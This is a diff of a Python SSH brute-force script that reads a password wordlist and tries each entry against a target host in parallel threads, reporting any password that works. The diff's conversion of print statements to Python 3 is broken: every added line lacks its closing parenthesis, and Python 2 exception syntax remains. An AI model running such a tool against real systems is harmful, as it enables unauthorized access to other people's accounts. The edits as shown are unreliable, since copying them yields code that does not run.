@@ -16,7 +16,7 @@ def connect(host, user, password, release):
     try:
         s = pxssh.pxssh()
         s.login(host, user, password)
-        print '[+] Password Found: ' + password
+        print('[+] Password Found: ' + password
 	Found = True
     except Exception, e:
         if 'read_nonblocking' in str(e):
@@ -47,22 +47,22 @@ def main():
     user = options.user
 
     if host == None or passwdFile == None or user == None:
-        print parser.usage
+        print(parser.usage
         exit(0)
         
     fn = open(passwdFile, 'r')
     for line in fn.readlines():
 
 	if Found:
-	    print "[*] Exiting: Password Found"
+	    print("[*] Exiting: Password Found"
 	    exit(0)
         if Fails > 5:
-	    print "[!] Exiting: Too Many Socket Timeouts"
+	    print("[!] Exiting: Too Many Socket Timeouts"
 	    exit(0)
 
 	connection_lock.acquire()
         password = line.strip('\r').strip('\n')
-	print "[-] Testing: "+str(password)
+	print("[-] Testing: "+str(password)
         t = Thread(target=connect, args=(host, user,\
           password, True))
         child = t.start()
